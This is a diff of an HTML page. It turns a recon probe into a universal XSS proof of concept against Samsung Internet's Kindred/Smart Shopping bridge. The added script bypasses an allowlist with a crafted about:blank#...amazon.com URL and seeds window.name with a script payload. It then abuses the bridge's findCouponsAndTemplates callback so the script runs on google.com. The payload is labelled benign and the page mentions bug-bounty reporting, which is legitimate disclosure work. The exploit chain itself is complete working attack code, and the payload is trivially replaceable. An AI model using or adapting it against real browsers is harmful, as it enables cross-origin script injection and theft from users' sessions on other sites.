@@ -1,98 +1,121 @@
-<!doctype html>
 <html lang="en">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Kindred recon</title>
-<style>
- body{margin:0;font-family:-apple-system,system-ui,Arial,sans-serif;padding:12px;line-height:1.45;color:#111}
- h1{font-size:16px}h2{font-size:12px;margin:12px 0 4px;color:#333}
- pre{background:#f4f4f7;border:1px solid #dcdce2;border-radius:6px;padding:8px;font-size:11px;white-space:pre-wrap;word-break:break-all}
- input{width:100%;padding:9px;font-size:15px;border:1px solid #dcdce2;border-radius:8px;margin:4px 0}
- button{font-size:14px;padding:11px;width:100%;border:1px solid #dcdce2;border-radius:8px;background:#fff;margin:5px 0}
- code{background:#eee;padding:1px 5px;border-radius:4px}
- .warn{color:#b23;font-size:11px}
- #banner{display:none;background:#c0392b;color:#fff;padding:12px;border-radius:8px;font-weight:700;font-size:13px;margin-bottom:10px}
-</style>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Samsung Kindred UXSS PoC (instrumented, benign)</title>
+  <style>
+    body { max-width: 760px; margin: 24px auto; padding: 0 16px; font: 15px/1.5 system-ui, sans-serif; }
+    button { padding: 12px 18px; font: inherit; font-weight: 650; width:100%; margin:6px 0; }
+    pre { min-height: 14em; padding: 12px; overflow-wrap: anywhere; white-space: pre-wrap; background: #f3f4f6; font-size:12px; }
+    .warn{color:#b23;font-size:12px}
+  </style>
 </head>
 <body>
-<div id="banner"></div>
-<h1>Samsung Internet — Kindred / Smart-Shopping recon + race (benign)</h1>
-<p style="font-size:12px;color:#666">Open in <b>Samsung Internet</b>, Smart Shopping ON, allow popups.
-<b>Step 1 is the important one:</b> it opens <code>about:blank#amazon.com</code> (which inherits the opener origin, so we
-can read it) and watches whether Kindred injects any <b>web-context</b> artifact (a global / bridge / DOM node) — and WHEN.
-If step 1 finds nothing, there is no UXSS primitive in this build (likely native-only UI or feature off).</p>
+  <main id="main">
+    <h1>Samsung Internet Kindred UXSS — instrumented (benign)</h1>
+    <p class="warn">Benign browser-isolation test. Payload only proves origin via alert(document.domain) + a neutral marker — no defacement, no data theft. Own test build. Report to Samsung Mobile
+ Security Rewards.</p>
+    <button id="run" type="button">Run PoC (watch the log for the failing GATE)</button>
+    <pre id="log" aria-live="polite"></pre>
+  </main>
 
-<h2>allowlist-bypass trigger URL</h2>
-<input id="trig" value="about:blank#amazon.com">
-<h2>target context (your logic: google.com)</h2>
-<input id="victim" value="https://google.com/">
-<h2>race delay (ms) — set just UNDER the injection time found in step 1</h2>
-<input id="delay" value="120">
-
-<button onclick="recon()">1 · RECON — does Kindred inject into about:blank#amazon.com? (readable, timed)</button>
-<button onclick="reconReal()">1b · BASELINE — compare against a REAL allowlisted site (prove feature exists)</button>
-<button onclick="race()">2 · RACE — trigger then navigate to target at delay</button>
-
-<h2>log</h2><pre id="log"></pre>
-<p class="warn">Benign: no payload is added; we only observe whether/when Samsung's own feature injects into the web context. Own test build. Report to Samsung Mobile Security Rewards.</p>
-
-<script>
-function g(id){return document.getElementById(id);}
-var L=g('log'); function log(m){try{L.textContent=m+'\n'+L.textContent;}catch(e){}}
-var RE=/kindred|smart.?shop|shopping|samsung|sbrowser|coupon|cashback|price|assistant|deal|sshop/i;
-var m=/SamsungBrowser\/([\d.]+)/.exec(navigator.userAgent);
-log('SamsungBrowser='+(m?m[1]:'NOT DETECTED — open in Samsung Internet')+'  origin='+location.origin);
-
-// ---- watch a child window we control (same-origin) for Kindred web-context injection ----
-function watchChild(w, label){
-  var t0=Date.now(), base={}, found=false;
-  try{ for(var k in w) base[k]=1; }catch(e){}
-  var iv=setInterval(function(){
-    try{
-      var cur = ''+ (w.location && w.location.href);
-      // new globals injected into the child window
-      for(var k in w){ if(!base[k]){ base[k]=1;
-        var hit=RE.test(k);
-        log('+'+(Date.now()-t0)+'ms ['+label+'] new global: '+k+(hit?'  <== KINDRED?':''));
-        if(hit){ found=true; flag(label+' global window.'+k+' @+'+(Date.now()-t0)+'ms'); }
-      } }
-      // injected DOM in the child
-      var root = w.document && w.document.documentElement;
-      var html = root ? root.innerHTML : '';
-      if(html && RE.test(html)){ found=true; var mm=html.match(RE); flag(label+' DOM artifact ("'+(mm&&mm[0])+'") @+'+(Date.now()-t0)+'ms'); log('+'+(Date.now()-t0)+'ms ['+label+'] KINDRED DOM: '+html.slice(0,160)); }
-    }catch(e){
-      log('+'+(Date.now()-t0)+'ms ['+label+'] child now cross-origin / unreadable ('+e+') — stop watch');
-      clearInterval(iv); return;
+  <script>
+  (() => {
+    'use strict';
+    const params = new URLSearchParams(location.search);
+    if (params.has('bootstrap')) {
+      document.querySelector('#main').innerHTML =
+        '<h1>Attacker bootstrap document</h1><p>Waiting for the parent controller.</p>';
+      return;
     }
-  }, 40);
-  setTimeout(function(){ clearInterval(iv); log('['+label+'] watch ended (12s). kindred web-context injection: '+(found?'YES':'NONE — likely native-only UI or feature off')); }, 12000);
-}
-function flag(msg){ var b=g('banner'); b.style.display='block'; b.textContent='⚠ KINDRED WEB-CONTEXT INJECTION: '+msg+'  — this is the UXSS primitive (readable in about:blank#amazon.com which inherits our origin).'; }
 
-function recon(){
-  var trig=(g('trig').value||'about:blank#amazon.com').trim();
-  var w=window.open(trig,'_blank');
-  if(!w){ log('popup blocked'); return; }
-  log('RECON: opened '+trig+' (inherits our origin -> readable). watching for Kindred injection + timing…');
-  watchChild(w,'bypass');
-}
-function reconReal(){
-  var w=window.open('https://www.amazon.com/','_blank');
-  if(!w){ log('popup blocked'); return; }
-  log('BASELINE: opened REAL amazon.com. (will go cross-origin once it loads, but watch for any same-origin window before commit / native UI). If NOTHING injects on real amazon either, Smart Shopping is off/native-only here.');
-  watchChild(w,'real-amazon');
-}
-function race(){
-  var trig=(g('trig').value||'about:blank#amazon.com').trim();
-  var victim=(g('victim').value||'https://google.com/').trim();
-  var delay=Math.max(0,parseInt(g('delay').value||'120',10)||120);
-  var w=window.open(trig,'_blank');
-  if(!w){ log('popup blocked'); return; }
-  log('RACE: opened '+trig+'. navigating child to '+victim+' in '+delay+'ms');
-  watchChild(w,'race');   // keep watching across the navigation (until cross-origin)
-  setTimeout(function(){ try{ w.location.href=victim; log('  navigated child to '+victim+'. If a Kindred overlay appears ON that page = cross-origin injection (watch the tab).'); }catch(e){ log('nav err '+e);} }, delay);
-}
-</script>
+    const output = document.querySelector('#log');
+    const button = document.querySelector('#run');
+    let running = false, enumerated = false;
+
+    function log(message){ const t=new Date().toISOString().slice(11,23); output.textContent += `[${t}] ${message}\n`; }
+
+    // version gate
+    const vm = /SamsungBrowser\/([\d.]+)/.exec(navigator.userAgent);
+    log('UA SamsungBrowser=' + (vm?vm[1]:'NOT SAMSUNG — open in Samsung Internet'));
+    if (vm && vm[1] !== '30.0.5.24') log('NOTE: this PoC was written for 30.0.5.24; you are on '+vm[1]+'. Bridge/method names or the bypass may differ or be patched.');
+
+    function bootstrapUrl(){ const u=new URL(location.href); u.searchParams.set('bootstrap', String(Date.now())); u.hash='attacker-bootstrap'; return u.href; }
+
+    // BENIGN payload (was: PWNED defacement) — proves cross-origin execution only
+    const PAYLOAD = '<scr'+'ipt>alert("BENIGN UXSS — ran as "+document.domain);document.write("<h1>BENIGN UXSS TEST \\u2014 executed as "+document.domain+"</h1>");</scr'+'ipt>';
+
+    function run(){
+      if (running) return;
+      const popup = open(bootstrapUrl(), '_blank');
+      if (!popup){ log('GATE0 FAIL: popup blocked — allow popups and click the button'); return; }
+      running = true; button.disabled = true;
+      log('GATE0 ok: popup opened (attacker origin, readable)');
+
+      popup.name = PAYLOAD;
+      log('seeded window.name with benign domain-proof payload (survives cross-origin nav)');
+
+      // phase 1: parser-confused about:blank to trip the allowlist
+      setTimeout(() => {
+        try { popup.location.replace('about:blank#kindred-probe://amazon.com/'); log('phase1: navigated popup to parser-confused about:blank#...amazon.com'); }
+        catch (e){ log('phase1 FAIL: '+e); }
+      }, 750);
+
+      // phase 2: reload to materialize the bridge
+      setTimeout(() => {
+        try { popup.location.reload(); log('phase2: reloaded crafted about:blank to materialize KindredWebInterface'); }
+        catch (e){ log('phase2 FAIL: '+e); }
+      }, 2000);
+
+      // GATE1: does KindredWebInterface appear?  (also enumerate kindred-ish globals so we see renames)
+      const started = performance.now();
+      let sawAnyKindredGlobal = false;
+      const poll = setInterval(() => {
+        const dt = Math.round(performance.now() - started);
+        if (dt > 20000){
+          clearInterval(poll); running=false; button.disabled=false;
+          log('GATE1 TIMEOUT: KindredWebInterface never appeared in 20s.');
+          log('=> Most likely: Smart Shopping off/region-gated, OR the about:blank#...amazon.com bypass does not pass the allowlist in your build, OR the bridge was renamed/removed. Run the recon
+file (step 1b baseline on real amazon) to confirm the feature injects ANY web-context bridge at all.');
+          return;
+        }
+        try {
+          // surface ANY kindred-ish global even if the exact name changed
+          if (!sawAnyKindredGlobal){
+            for (const k in popup){ if (/kindred|coupon|shop|sbrowser|samsung/i.test(k)){ sawAnyKindredGlobal=true; log('GATE1 hint: child has global "'+k+'" @+'+dt+'ms'); } }
+          }
+          if (typeof popup.KindredWebInterface === 'undefined') return;
+          clearInterval(poll);
+          log('GATE1 ok: KindredWebInterface acquired @+'+dt+'ms (in attacker-origin document)');
+
+          // enumerate the real methods once (confirms signatures / patches)
+          if (!enumerated){ enumerated=true; try{
+            const methods=[]; for (const k in popup.KindredWebInterface) methods.push(k);
+            log('bridge methods: '+(methods.join(', ')||'(none enumerable)'));
+          }catch(e){ log('enumerate err '+e); } }
+
+          // GATE2: guard method
+          let guardProof;
+          try { guardProof = popup.KindredWebInterface.isCheckoutPage('amazon.com'); log('GATE2 ok: isCheckoutPage("amazon.com")='+guardProof); }
+          catch (e){ log('GATE2 FAIL: isCheckoutPage threw '+e+' (method renamed/removed?)'); running=false; button.disabled=false; return; }
+
+          // GATE3: queue the async callback sink, then navigate to google so it lands cross-origin
+          try {
+            for (let i=0;i<10;i++){ popup.KindredWebInterface.findCouponsAndTemplates(`uxss-delay-${Date.now()}-${i}.amazon.com`,'','console.log',1); }
+            popup.KindredWebInterface.findCouponsAndTemplates('amazon.com','','window.name.toString',1);
+            log('GATE3: queued findCouponsAndTemplates callbacks (incl. window.name.toString)');
+          } catch (e){ log('GATE3 FAIL: findCouponsAndTemplates threw '+e+' (sink renamed/removed/patched?)'); running=false; button.disabled=false; return; }
+
+          popup.location.replace('https://www.google.com/');
+          log('GATE4: navigated popup to https://www.google.com/ . If the async callback fires now, you should see an ALERT "BENIGN UXSS — ran as www.google.com" ON the google tab = UXSS.');
+          log('If google loads clean with no alert within a few seconds => callback did not execute cross-origin (sync, or patched).');
+          running=false; button.disabled=false;
+        } catch (e){ clearInterval(poll); running=false; button.disabled=false; log('poll err: '+e); }
+      }, 100);
+    }
+
+    button.addEventListener('click', run);
+  })();
+  </script>
 </body>
 </html>
